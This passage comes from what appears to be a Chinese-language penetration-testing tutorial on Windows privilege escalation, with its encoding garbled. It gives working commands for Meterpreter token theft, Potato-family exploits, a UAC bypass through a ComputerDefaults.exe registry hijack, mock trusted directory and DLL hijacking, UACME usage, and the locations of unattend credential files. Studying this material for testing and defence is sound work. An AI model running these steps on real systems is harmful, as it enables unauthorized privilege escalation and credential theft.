class="line">load incognito    #åŠ è½½incognitoæ¨¡å—</span><br><span class="line">list_tokens -u    #åˆ—å‡ºä¸»æœºä¸Šçš„æ‰€æœ‰è®¿é—®ä»¤ç‰Œ</span><br><span class="line">impersonate_token &quot;NT AUTHORITY\SYSTEM&quot;    #çªƒå–NT AUTHORITY\SYSTEMè´¦æˆ·çš„ä»¤ç‰Œ</span><br><span class="line">steal_token &lt;PID&gt;     #ä»æŒ‡å®šçš„è¿›ç¨‹ä¸­çªƒå–ä»¤ç‰Œ</span><br></pre></td></tr></table></figure><p>å…ˆä¸Šçº¿ä¸€å°ä¸»æœº,è·å–administratoræƒé™</p><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309071724020.png" alt="image.png"></p><p>åŠ è½½incognitoå¹¶çªƒå–SYSTEMæƒé™<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309071729580.png" alt="image.png"></p><h5 id="3-é€šè¿‡ä»¤ç‰Œè·å–TustedInstalleræƒé™"><a href="#3-é€šè¿‡ä»¤ç‰Œè·å–TustedInstalleræƒé™" class="headerlink" title="3.é€šè¿‡ä»¤ç‰Œè·å–TustedInstalleræƒé™"></a>3.é€šè¿‡ä»¤ç‰Œè·å–TustedInstalleræƒé™</h5><p>ä¸€èˆ¬SYSTEMä¸ºWindowsç³»ç»Ÿæœ€é«˜æƒé™ï¼Œä½†æ˜¯å³ä¾¿è·å–äº†SYSTEMæƒé™ï¼Œä¹Ÿä¸èƒ½ä¿®æ”¹Windowsç³»ç»Ÿæ–‡ä»¶ã€‚</p><p>Windows Vistaå¼€å§‹ç³»ç»Ÿå†…ç½®äº†ä¸€ä¸ªTrustedInstallerå®‰å…¨ä¸»ä½“ï¼Œæ‹¥æœ‰ä¿®æ”¹ç³»ç»Ÿæ–‡ä»¶æƒé™ï¼Œä¸“ç”¨äºå¯¹ç³»ç»Ÿè¿›è¡Œç»´æŠ¤ã€æ›´æ–°ç­‰æ“ä½œã€‚<br>TrustedInstallerä»¥ä¸€ä¸ªè´¦æˆ·ç»„çš„å½¢å¼å‡ºç°ï¼Œå³NT SERVICE\TrustedInstallerã€‚ </p><p>TrustedInstalleræœ¬èº«ä¹Ÿæ˜¯ä¸€ä¸ªæœåŠ¡,å½“å¯åŠ¨è¯¥æœåŠ¡æ—¶,ä¼šè¿è¡ŒTrustedInstaller.exeç¨‹åº,è¯¥ç¨‹åºåœ¨ç³»ç»Ÿä¸Šçš„è·¯å¾„ä¸Šä¸ºâ€C:\Windows\servicing\TrustedInstaller.exeâ€,å…¶æ‹¥æœ‰è€…ä¸ºNT SERVICE\TrustedInstallerã€‚</p><p>æµ‹è¯•äººå‘˜å¯ä»¥é€šè¿‡çªƒå–TrustedInstaller.exeçš„ä»¤ç‰Œ,ä»¥æå‡è‡³TrustedInstalleræƒé™</p><p>ä½¿ç”¨icaclså‘½ä»¤å¯ä»¥æŸ¥çœ‹ç›®å½•æƒé™</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\&gt;icacls &quot;C:\Windows\servicing&quot;</span><br></pre></td></tr></table></figure><p>å®éªŒ:<br>å…ˆå¯åŠ¨TrustedInstalleræœåŠ¡</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sc start TrustedInstaller</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309071746496.png" alt="image.png"><br>è®°å½•PIDåçªƒå–ä»¤ç‰Œ</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">steal_token &lt;PID&gt;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309071748079.png" alt="image.png"></p><h4 id="3-Potatoå®¶æ—ææƒ"><a href="#3-Potatoå®¶æ—ææƒ" class="headerlink" title="3.Potatoå®¶æ—ææƒ"></a>3.Potatoå®¶æ—ææƒ</h4><p>ä½¿ç”¨ä»¤ç‰Œçªƒå–çš„å‰ææ˜¯ç”¨æˆ·æ‹¥æœ‰SeAssignPrimaryTokenPrivilegeæˆ–SeImpersonatePrivilegeç‰¹æƒ<br>æ‹¥æœ‰è¿™ä¸¤ä¸ªç‰¹æƒå¯ä»¥å…è®¸ç”¨æˆ·åœ¨å¦ä¸€ä¸ªç”¨æˆ·çš„å®‰å…¨ä¸Šä¸‹æ–‡ä¸­è¿è¡Œä»£ç ç”šè‡³åˆ›å»ºæ–°è¿›ç¨‹.</p><p>Potatoå®¶æ—æœ‰ç”¨è¿™ä¸¤ä¸ªæƒé™å¹¶å°†å·²è·å–çš„NT AUTHORITY\SYSTEMè´¦æˆ·çš„è®¿é—®ä»¤ç‰Œä¼ å…¥CreateProcessWithTokenWæˆ–CreateProcessAsUserAå‡½æ•°è¿›è¡Œè°ƒç”¨,ä»è€Œåœ¨NT AUTHORITY\SYSTEMè´¦æˆ·çš„ä¸Šä¸‹æ–‡ä¸­ç©¿ä»¶æ–°è¿›ç¨‹,ä»¥æå‡è‡³SYSTEMæƒé™</p><h5 id="1-Rotten-Potato"><a href="#1-Rotten-Potato" class="headerlink" title="1.Rotten Potato"></a>1.Rotten Potato</h5><p>é€šè¿‡æ‹¦æˆªNTLMèº«ä»½è®¤è¯è¯·æ±‚,å¹¶ä¼ªé€ NT AUTHORITY\SYSTEMè´¦æˆ·çš„è®¿é—®ä»¤ç‰Œ<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309072010602.png" alt="image.png"><br>æœ‰æ—¶è¦ææƒä¸æ˜¯ç®¡ç†å‘˜ç”¨æˆ·,ä½¿ç”¨incognitoæ— æ³•åˆ—ä¸¾å‡ºé«˜æƒé™ç”¨æˆ·çš„ä»¤ç‰Œ<br>å‘ç›®æ ‡ä¸»æœºä¸Šä¼ RottenPotatoåˆ©ç”¨ç¨‹åº,åœ¨msfä¸­è¿è¡Œ</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">execute -Hc -f rottenpotato.exe</span><br></pre></td></tr></table></figure><p>å†æ‰§è¡Œlist_token -u å‘½ä»¤å°±èƒ½åˆ—ä¸¾å‡ºNT AUTHORITY\SYSTEMè´¦æˆ·çš„ä»¤ç‰Œ,ä½¿ç”¨impersonate_tokenä¼ªé€ è¯¥ä»¤ç‰Œå³å¯è·å–SYSTEMæƒé™</p><h5 id="2-Juicy-Potato"><a href="#2-Juicy-Potato" class="headerlink" title="2.Juicy Potato"></a>2.Juicy Potato</h5><p>ä¸Rotten PotatoåŸç†å‡ ä¹å®Œå…¨ç›¸åŒ,åªæ˜¯åœ¨åè€…çš„åŸºç¡€ä¸Šåšäº†æ‰©å±•ã€‚<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309072013421.png" alt="image.png"><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309072014239.png" alt="image.png"><br>ä»¥ä¸Šææƒæ–¹æ³•åªé€‚ç”¨äºWindows 10 version 1809 å’ŒWindows Server 2019 ä¹‹å‰ç‰ˆæœ¬çš„ç³»ç»Ÿ,åœ¨æ­¤ä¹‹åå¾®è½¯é€šè¿‡æ£€æŸ¥RPCç»‘å®šå­—ç¬¦ä¸²ä¸­æŒ‡å®šçš„ç«¯å£æ¥ä¿®å¤äº†è¿™ä¸ªé—®é¢˜ã€‚</p><h5 id="3-Pipe-Potatoï¼ˆPrintSpoofer"><a href="#3-Pipe-Potatoï¼ˆPrintSpoofer" class="headerlink" title="3.Pipe Potatoï¼ˆPrintSpoofer)"></a>3.Pipe Potatoï¼ˆPrintSpoofer)</h5><p>ä¸»è¦åˆ©ç”¨æ‰“å°æœºç»„ä»¶è·¯å¾„æ£€æŸ¥ä¸­å­˜åœ¨çš„ä¸€ä¸ªBug,ä½¿é«˜æƒé™çš„æœåŠ¡èƒ½è¿æ¥åˆ°æµ‹è¯•äººå‘˜åˆ›å»ºçš„å‘½åç®¡é“,ä»¥è·å–é«˜æƒé™è´¦æˆ·çš„ä»¤ç‰Œæ¥åˆ›å»ºæ–°è¿›ç¨‹</p><h5 id="4-Sweet-Potato"><a href="#4-Sweet-Potato" class="headerlink" title="4.Sweet Potato"></a>4.Sweet Potato</h5><p>SweetPotatoé›†æˆäº†RottenPotatoã€JuicyPotatoã€Rogue WinRmå’ŒPrintSpooferçš„åŠŸèƒ½ï¼Œ<br>ç”¨æ¥å°†æœåŠ¡è´¦æˆ·æƒé™æå‡è‡³SYSTEMæƒé™.<br>é¡¹ç›®åœ°å€:<a href="https://github.com/CCob/SweetPotato">https://github.com/CCob/SweetPotato</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SweetPotato by @_EthicalChaos_</span><br><span class="line">  Orignal RottenPotato code and exploit by @foxglovesec</span><br><span class="line">  Weaponized JuciyPotato by @decoder_it and @Guitro along with BITS WinRM discovery</span><br><span class="line">  PrintSpoofer discovery and original exploit by @itm4n</span><br><span class="line">  EfsRpc built on EfsPotato by @zcgonvh and PetitPotam by @topotam</span><br><span class="line">  -c, --clsid=VALUE          CLSID (default BITS:</span><br><span class="line">                               4991D34B-80A1-4291-83B6-3328366B9097)</span><br><span class="line">  -m, --method=VALUE         Auto,User,Thread (default Auto)</span><br><span class="line">  -p, --prog=VALUE           Program to launch (default cmd.exe)</span><br><span class="line">  -a, --args=VALUE           Arguments for program (default null)</span><br><span class="line">  -e, --exploit=VALUE        Exploit mode</span><br><span class="line">                               [DCOM|WinRM|EfsRpc|PrintSpoofer(default)]</span><br><span class="line">  -l, --listenPort=VALUE     COM server listen port (default 6666)</span><br><span class="line">  -h, --help                 Display this help</span><br></pre></td></tr></table></figure><h2 id="5-Bypass-UAC"><a href="#5-Bypass-UAC" class="headerlink" title="5.Bypass UAC"></a>5.Bypass UAC</h2><p>ç”¨æˆ·è´¦æˆ·æ§åˆ¶(UAC) æ˜¯Windowsæ“ä½œç³»ç»Ÿé‡‡ç”¨çš„ä¸€ç§æ§åˆ¶æœºåˆ¶,å¯ä»¥é˜»æ­¢è‡ªåŠ¨å®‰è£…æœªç»æˆæƒçš„åº”ç”¨å¹¶é˜²æ­¢æ„å¤–æ›´æ”¹ç³»ç»Ÿè®¾ç½®.</p><p>UACé™åˆ¶æ‰€æœ‰ç”¨æˆ·åŒ…æ‹¬éRID500çš„ç”¨æˆ·ä½¿ç”¨æ ‡å‡†ç”¨æˆ·ç™»å½•åˆ°è®¡ç®—æœºå¹¶åœ¨æ ‡æ³¨ç”¨æˆ·çš„å®‰å…¨ä¸Šä¸‹æ–‡ä¸­è®¿é—®èµ„æºå’Œè¿è¡Œã€‚</p><p>éRIDç®¡ç†å‘˜ç”¨æˆ·ç™»å½•å,ç³»ç»Ÿä¼šä¸ºå…¶åˆ›å»ºä¸¤ä¸ªå•ç‹¬çš„è®¿é—®ä»¤ç‰Œ:æ ‡å‡†ç”¨æˆ·ä»¤ç‰Œå’Œç®¡ç†å‘˜è®¿é—®ä»¤ç‰Œã€‚</p><p>æ ‡å‡†ä»¤ç‰Œç§»é™¤ä¸€äº›windowsç‰¹æƒ,ç”¨äºå¯åŠ¨ä¸æ‰§è¡Œç®¡ç†ä»»åŠ¡çš„åº”ç”¨ç¨‹åºã€‚</p><p>å½“ç®¡ç†å‘˜éœ€è¦æ‰§è¡Œé«˜æƒé™ç®¡ç†ä»»åŠ¡æ—¶,Windowsä¼šè‡ªåŠ¨æç¤ºç”¨æˆ·äºˆä»¥æ‰¹å‡†,åŒæ„ååˆ™å…è®¸ç®¡ç†å‘˜è®¿é—®ä»¤ç‰Œã€‚</p><p>å®æˆ˜ä¸­,æµ‹è¯•äººå‘˜å¯ä»¥ç»•è¿‡WindowsUACæœºåˆ¶,ä½¿éRID500çš„ç®¡ç†å‘˜è´¦æˆ·å¯ä»¥ä¸éœ€è¦ç”¨æˆ·æ‰¹å‡†ç›´æ¥è®¿é—®ç®¡ç†å‘˜è®¿é—®ä»¤ç‰Œ,ä»è€Œè·å–å…¨éƒ¨çš„ç®¡ç†æƒé™</p><h4 id="1-UACç™½åå•"><a href="#1-UACç™½åå•" class="headerlink" title="1.UACç™½åå•"></a>1.UACç™½åå•</h4><p>å¾®è½¯åœ¨ç”¨æˆ·è´¦æˆ·æ§åˆ¶ä¸­ä¸ºä¸€äº›ç³»ç»Ÿç¨‹åºè®¾ç½®äº†ç™½åå•æœºåˆ¶,æ‰€æœ‰ç™½åå•çš„ç¨‹åº,ç™½åå•ç¨‹åºé™é»˜è‡ªåŠ¨æå‡åˆ°ç®¡ç†å‘˜æƒé™,å¦‚slui.exe,wusa.exe,taskmgr.exe,msra.exeç­‰,æµ‹è¯•äººå‘˜å¯ä»¥é€šè¿‡å¯¹è¿™äº›ç™½åå•ç¨‹åºè¿›è¡ŒdllåŠ«æŒ,dllæ³¨å…¥æˆ–è€…æ³¨å†Œè¡¨åŠ«æŒç­‰ç»•è¿‡UACå¹¶ææƒ</p><p>åœ¨å¯»æ‰¾ç™½åå•å¯ä»¥ä½¿ç”¨Sigcheck å’ŒStrings<br>ä¸‹è½½åœ°å€:<br>Sigcheck:<a href="https://learn.microsoft.com/zh-cn/sysinternals/downloads/sigcheck">https://learn.microsoft.com/zh-cn/sysinternals/downloads/sigcheck</a><br>Strings:<a href="https://learn.microsoft.com/zh-cn/sysinternals/downloads/sigcheck">https://learn.microsoft.com/zh-cn/sysinternals/downloads/sigcheck</a></p><p>ç™½åå•ç¨‹åºçš„ç‰¹æ€§-&gt;Manifestæ•°æ®ä¸­çš„autoElevateå±æ€§å€¼ä¸ºTrue,Sigcheck å¯ä»¥æ£€æµ‹ç¨‹åºæ˜¯å¦æœ‰autoElevateå±æ€§<br>ä»¥ComputerDefaults.exeä¸ºä¾‹</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sigcheck.exe /acceteula -m C:\Windows\System32\ComputerDefaults.exe</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309121457924.png" alt="image.png"></p><p>Stringså¯ä»¥æ‰¾å‡ºæ‰€æœ‰å…·æœ‰autoElevateå±æ€§çš„ç¨‹åº</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">strings.exe /accepteula -s C:\Windows\System32\*.exe | findstr /i &quot;autoElevate&quot;</span><br></pre></td></tr></table></figure><p>æˆåŠŸæ‰¾å‡º<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309121459542.png" alt="image.png"></p><p>ä»¥ComputerDefaults.exeä¸ºä¾‹,é€šè¿‡æ”¹ç¨‹åºç»•è¿‡UACå®ç°ææƒ:</p><p>1.ComputerDefaults.exeè¿è¡Œåä¼šæ‰“å¼€Windowsçš„é»˜è®¤åº”ç”¨ç•Œé¢,å¹¶æœªå‡ºç°UACå¼¹çª—<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309121501898.png" alt="image.png"></p><p>2.ä½¿ç”¨Process Monitor ç›‘æ§ComputerDefaults.exeè¿›ç¨‹çš„æ‰€æœ‰æ“ä½œè¡Œä¸º(ä¸»è¦æ˜¯ç›‘æ§æ³¨å†Œè¡¨å’Œæ–‡ä»¶çš„æ“ä½œ)<br>Process Monitor ä¸‹è½½åœ°å€: <a href="https://learn.microsoft.com/en-us/sysinternals/downloads/procmon">https://learn.microsoft.com/en-us/sysinternals/downloads/procmon</a><br>é€šè¿‡Process Monitorå¯ä»¥æŸ¥åˆ°æŒ‡å®šè¿›ç¨‹,åªè¦é€šè¿‡Filterè®¾å®šç›¸åº”çš„è§„åˆ™å³å¯<br>è®¾ç½®æŸ¥çœ‹ComputerDefaults.exeè¿›ç¨‹çš„Pathä¸­åŒ…å«commandçš„å†…å®¹<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309131451118.png" alt="image.png"></p><p>å‘ç°å­˜åœ¨æ‰§è¡Œå¯¹HKLM\SOFTWARE\Clinets\StartMenuinternet\IEXPLORE.EXE\InstallInfo\ReinstallCommandçš„regQueryçš„è¿›ç¨‹,æ‰§è¡Œå‘½ä»¤ä¸ºC:\Windows\System32\ie4uinit.exe -reinstallã€‚<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309131454306.png" alt="image.png"></p><p>ä»¥shell\open\commandå‘½åçš„æ³¨å†Œè¡¨å¯èƒ½å­˜å‚¨å¯æ‰§è¡Œæ–‡ä»¶çš„è·¯å¾„,ç¨‹åºä¼šè¯»å–å…¶ä¸­çš„å¯æ‰§è¡Œæ–‡ä»¶</p><p>3.æ‰§è¡Œ</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg add &quot;HKLM\SOFTWARE\Clinets\StartMenuinternet\IEXPLORE.EXE\InstallInfo&quot; /v ReinstallCommand /t REG_SZ /d &quot;C:\Windows\System32\cmd.exe&quot; /f</span><br></pre></td></tr></table></figure><p>å°†ä¸Šè¿°è¿è¡ŒComputerDefaults.exeäº§ç”Ÿçš„æŸ¥è¯¢æ³¨å†Œè¡¨HKLM\SOFTWARE\Clinets\StartMenuinternet\IEXPLORE.EXE\InstallInfoä¸­è¦æ‰§è¡Œçš„å‘½ä»¤ReinstallCommandçš„å€¼æ”¹ä¸ºcmdã€‚<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309131501063.png" alt="image.png"></p><p>å†æ¬¡è¿è¡ŒComputerDefaults.exe,æˆåŠŸå¼¹å‡ºç³»ç»Ÿæƒé™çš„cmdï¼ŒæˆåŠŸè·å–å…³é—­UACçš„cmd<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309131502756.png" alt="image.png"></p><p>å¦‚æœå°†ç›¸å…³æ‰§è¡Œè·¯å¾„æ”¹ä¸ºæ¶æ„ç¨‹åºï¼Œå†æ¬¡æ‰§è¡ŒComputerDefaults.exeæ—¶ï¼Œæ¶æ„ç¨‹åºä¼šä¼´éšComputerDefaults.exeçš„å¯åŠ¨é»˜è®¤é€šè¿‡UACæ§åˆ¶å¹¶ä»¥æå‡çš„æƒé™è¿è¡Œï¼Œå¯ä»¥ä¸Šçº¿msfã€‚</p><h4 id="2-DLLåŠ«æŒ"><a href="#2-DLLåŠ«æŒ" class="headerlink" title="2.DLLåŠ«æŒ"></a>2.DLLåŠ«æŒ</h4><p>æµ‹è¯•äººå‘˜å¯ä»¥é€šè¿‡ä¸€äº›æ‰‹æ®µï¼Œæ¬ºéª—åˆæ³•çš„ã€å—ä¿¡ä»»çš„åº”ç”¨ç¨‹åºåŠ è½½ä»»æ„çš„dllæ–‡ä»¶ï¼Œä»è€Œé€ æˆDLLåŠ«æŒã€‚</p><p>å½“åº”ç”¨ç¨‹åºåŠ è½½DLLæ—¶ï¼Œå¦‚æœæ²¡æœ‰æŒ‡å®šDLLçš„ç»å¯¹è·¯å¾„ï¼Œé‚£ä¹ˆç¨‹åºä¼šä»¥ç‰¹å®šçš„é¡ºåºä¾æ¬¡åœ¨æŒ‡å®šè·¯å¾„ä¸‹æœç´¢å¾…åŠ è½½çš„DLLã€‚åœ¨å¼€å¯å®‰å…¨DLLæœç´¢æ¨¡å¼(SafeDllSearchMode,Windows XP SP2 åé»˜è®¤å¼€å¯)çš„æƒ…å†µä¸‹ï¼Œå°†æŒ‰ä»¥ä¸‹é¡ºåºè¿›è¡Œæœç´¢ï¼šç¨‹åºå®‰è£…ç›®å½•â†’ç³»ç»Ÿç›®å½•(C:\Windows\System32)â†’16ä½ç³»ç»Ÿç›®å½•(C:\Windows\System)â†’Windowsç›®å½•(C:\Windows)â†’å½“å‰å·¥ä½œç›®å½•â†’PATHç¯å¢ƒå˜é‡ä¸­åˆ—å‡ºçš„å„ç›®å½•ã€‚</p><p>å°†åŒåæ¶æ„DLLæ–‡ä»¶æ”¾åœ¨åˆæ³•çš„DLLæ–‡ä»¶æ‰€åœ¨è·¯å¾„ä¹‹å‰æœç´¢ä½ç½®ï¼Œåº”ç”¨ç¨‹åºæœç´¢DLLæ—¶ï¼Œä¼šä»¥æ¶æ„DLLæ›¿ä»£åˆæ³•DLLã€‚</p><p>é€šå¸¸ç”¨äºä¸ºäº†å®ç°æƒé™çš„æŒä¹…åŒ–ã€‚</p><p>é€šè¿‡UACç™½åå•ç¨‹åºåŠ è½½DLLæ–‡ä»¶ï¼Œæµ‹è¯•äººå‘˜å°±å¯ä»¥å€ŸåŠ©ç™½åå•ç¨‹åºçš„è‡ªåŠ¨æå‡æƒé™æ¥Bypass UACã€‚ä½†æ˜¯è¿™äº›ç™½åå•åŠ è½½çš„DLLæ–‡ä»¶ä¸€èˆ¬ä½äºç³»ç»Ÿå¯ä¿¡ä»»ç›®å½•ä¸­ï¼Œè¿™äº›ç›®å½•å¯¹æ ‡å‡†ç”¨æˆ·æ¥è¯´é€šå¸¸éƒ½æ˜¯ä¸å¯å†™çš„ï¼Œéœ€è¦æ¨¡æ‹Ÿå¯ä¿¡ä»»ç›®å½•ã€‚</p><h4 id="3-æ¨¡æ‹Ÿå¯ä¿¡ä»»ç›®å½•"><a href="#3-æ¨¡æ‹Ÿå¯ä¿¡ä»»ç›®å½•" class="headerlink" title="3.æ¨¡æ‹Ÿå¯ä¿¡ä»»ç›®å½•"></a>3.æ¨¡æ‹Ÿå¯ä¿¡ä»»ç›®å½•</h4><p>ç™½åå• Manifestä¸­çš„autoElevateå±æ€§çš„å€¼ä¸ºTrue</p><p>ç¨‹åºè‡ªåŠ¨æå‡æƒé™ä¸‰ä¸ªæ¡ä»¶:<br>a.æ£€æŸ¥Manifestçš„autoElevateå±æ€§æ˜¯å¦ä¸ºTrue<br>b.æ£€æŸ¥å¯æ‰§è¡Œæ–‡ä»¶çš„ç­¾å<br>c.æ£€æŸ¥å¯æ‰§è¡Œæ–‡ä»¶æ˜¯å¦ä½äºç³»ç»Ÿå¯ä¿¡ä»»ç›®å½•,å¦‚C;\Windows\System32</p><p>ç³»ç»Ÿåœ¨æ£€æŸ¥å¯ä¿¡ä»»ç›®å½•æ—¶ï¼Œç›¸å…³å‡½æ•°ä¼šè‡ªåŠ¨å»æ‰å¯æ‰§è¡Œæ–‡ä»¶è·¯å¾„ä¸­çš„ç©ºæ ¼ã€‚<br>æ¯”å¦‚å¯æ‰§è¡Œæ–‡ä»¶ä½äºå¦‚ä¸‹ç›®å½•æ—¶ï¼Œåœ¨æ£€æŸ¥æ—¶ä¼šè‡ªåŠ¨å»æ‰å¯æ‰§è¡Œæ–‡ä»¶è·¯å¾„ä¸­çš„ç©ºæ ¼ï¼Œè¢«è®¤å®šä¸ºå¯ä¿¡ä»»ç›®å½•ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Windows   \System32</span><br></pre></td></tr></table></figure><p>æµ‹è¯•äººå‘˜å¯ä»¥å€Ÿæ­¤åˆ›å»ºä¸€ä¸ªåŒ…å«å°¾éšç©ºæ ¼çš„å¯ä¿¡ä»»ç›®å½•ï¼Œå°†ç™½åå•ç¨‹åºå¤åˆ¶åˆ°æ¨¡æ‹Ÿå¯ä¿¡ä»»ç›®å½•ä¸­ï¼Œé…åˆDLLåŠ«æŒç­‰æŠ€æœ¯å³å¯æˆåŠŸç»•è¿‡UACã€‚</p><p>ä¾‹å¦‚ä»¥WinSAT.exeä¸ºä¾‹<br>1.åˆ›å»ºC:\Windows \System32 æ¨¡æ‹Ÿå¯ä¿¡ä»»ç›®å½•ï¼Œå¹¶å°†ç™½åå•ç¨‹åºWinSAT.exeå¤åˆ¶åˆ°è¯¥ç›®å½•ä¸­</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">md &quot;\\?\C:\Windows &quot;</span><br><span class="line">md &quot;\\?\C:\Windows \System32&quot;</span><br><span class="line">copy C:\Windows\System32\WinSAT.exe &quot;\\?\C:\Windows \System32\WinSAT.exe&quot;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309131532620.png" alt="image.png"><br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309131532850.png" alt="image.png"></p><p>2.å¯åŠ¨æ¨¡æ‹Ÿå¯ä¿¡ä»»ç›®å½•ä¸­çš„WinSAT.exeï¼ŒåŒæ—¶ä½¿ç”¨Process Monitoræ£€æµ‹è¿›ç¨‹åŠ è½½çš„DLL<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309131538738.png" alt="image.png"></p><p>å‘ç°ç¨‹åºå°è¯•åœ¨å½“å‰åŒ…å«ç©ºæ ¼çš„ç›®å½•åŠ è½½DLLéƒ½å¤±è´¥äº†ï¼Œå¯ä»¥ç¼–å†™æ¶æ„DLLæ–‡ä»¶å¹¶æ”¾å…¥è¿›è¡ŒDLLåŠ«æŒã€‚è°ƒç”¨Win32APIæ‰§è¡Œç›¸åº”çš„æ“ä½œã€‚</p><h4 id="4-ç›¸å…³è¾…åŠ©å·¥å…·"><a href="#4-ç›¸å…³è¾…åŠ©å·¥å…·" class="headerlink" title="4.ç›¸å…³è¾…åŠ©å·¥å…·"></a>4.ç›¸å…³è¾…åŠ©å·¥å…·</h4><h5 id="1-UACME"><a href="#1-UACME" class="headerlink" title="1.UACME"></a>1.UACME</h5><p>UACMEæ˜¯ä¸€ä¸ªä¸“ç”¨äºç»•è¿‡UACçš„å¼€æºé¡¹ç›®ï¼Œæ‹¥æœ‰è¶…è¿‡70ç§Bypassæ–¹æ³•ã€‚<br>UACMEé¡¹ç›®ä¸­ï¼Œæ¯ç§BypassUACçš„æ–¹æ³•éƒ½æœ‰ä¸€ä¸ªæ•°å­—ç¼–å·ï¼Œç”±ä¸€ä¸ªåä¸ºAkagi.exeçš„ä¸»ç¨‹åºï¼ˆéœ€è¦è‡ªè¡Œç¼–è¯‘ç”Ÿæˆï¼‰è¿›è¡ŒåŒæ„è°ƒç”¨</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">akagi.exe [Key] [Param]</span><br><span class="line">#Key,æŒ‡å®šè¦ä½¿ç”¨çš„æ–¹æ³•çš„ç¼–å·</span><br><span class="line">#Param,æŒ‡å®šç»•è¿‡UACåè¦è¿è¡Œçš„å‘½ä»¤æˆ–ç¨‹åºï¼Œé»˜è®¤å¯åŠ¨ä¸€ä¸ªå…³é—­äº†UACçš„CMD</span><br><span class="line">ä¾‹å¦‚ï¼š</span><br><span class="line">akagi.exe 23 C:\Windows\System32\cmd.exe</span><br></pre></td></tr></table></figure><h5 id="2-MetaSploitçš„åˆ©ç”¨"><a href="#2-MetaSploitçš„åˆ©ç”¨" class="headerlink" title="2.MetaSploitçš„åˆ©ç”¨"></a>2.MetaSploitçš„åˆ©ç”¨</h5><p>msfå†…ç½®äº†å¤šä¸ªç”¨äºç»•è¿‡UACçš„æ¨¡å—</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf&gt;search bypassuac</span><br></pre></td></tr></table></figure><p>æˆåŠŸåˆ©ç”¨è¿™äº›æ¨¡å—ï¼Œå°†å¾—åˆ°ä¸€ä¸ªå…³é—­äº†UACä¿æŠ¤çš„Meterpreter,ç„¶åæ‰§è¡Œgetsystem,å¯ä»¥ç›´æ¥æå‡è‡³SYSTEMæƒé™</p><h2 id="6-ç”¨æˆ·å‡­æ®æ“ä½œ"><a href="#6-ç”¨æˆ·å‡­æ®æ“ä½œ" class="headerlink" title="6.ç”¨æˆ·å‡­æ®æ“ä½œ"></a>6.ç”¨æˆ·å‡­æ®æ“ä½œ</h2><h4 id="1-æšä¸¾Unattendedå‡­æ®"><a href="#1-æšä¸¾Unattendedå‡­æ®" class="headerlink" title="1.æšä¸¾Unattendedå‡­æ®"></a>1.æšä¸¾Unattendedå‡­æ®</h4><p>Unattendedï¼ˆæ— äººå€¼å®ˆï¼‰å®‰è£…å…è®¸åº”ç”¨ç¨‹åºåœ¨ä¸éœ€è¦ç®¡ç†å‘˜å…³æ³¨ä¸‹è‡ªåŠ¨å®‰è£…ã€‚<br>æ— äººå€¼å®ˆå®‰è£…çš„é—®é¢˜æ˜¯ä¼šåœ¨ç³»ç»Ÿä¸­æ®‹ç•™ä¸€äº›é…ç½®æ–‡ä»¶ï¼Œå…¶ä¸­å¯èƒ½åŒ…å«æœ¬åœ°ç®¡ç†å‘˜çš„ç”¨æˆ·åå’Œå¯†ç ï¼Œå¸¸è§çš„è·¯å¾„æœ‰</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\sysprep.inf</span><br><span class="line">C:\syspreg\sysprep.xml</span><br><span class="line">C:\Windows\system32\sysprep.inf</span><br><span class="line">C:\windows\system32\sysprep\sysprep.xml</span><br><span class="line">C:\unattend.xml</span><br><span class="line">C:\Windows\Panther\Unattend.xml</span><br><span class="line">C:\Windows\Panther\Unattended.xml</span><br><span class="line">C:\Windows\Panther\Unattend\Unattend.xml</span><br><span class="line">C:\Windows\Panther\Unattend\Unattended.xml</span><br><span class="line">C:\Windows\System32\Sysprep\Unattend.xml</span><br><span class="line">C:\Windows\System32\Sysprep\Panther\Unattend.xml</span><br></pre></td></tr></table></figure><p>æµ‹è¯•äººå‘˜å¯ä»¥å…¨ç›˜æœç´¢ä¸Šè¿°é…ç½®æ–‡ä»¶ï¼Œå¹¶æœç´¢å…³é”®å­—è·å–ç®¡ç†å‘˜å‡­æ®</p><p>åŒæ—¶msfæä¾›äº† post&#x2F;windows&#x2F;gather&#x2F;enum_unattendæ¨¡å—ï¼Œå¯ä»¥ä»Unattendé…ç½®æ–‡ä»¶ä¸­è‡ªåŠ¨åŒ–æ£€ç´¢å‡ºç”¨æˆ·å¯†ç ã€‚<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309131636125.png" 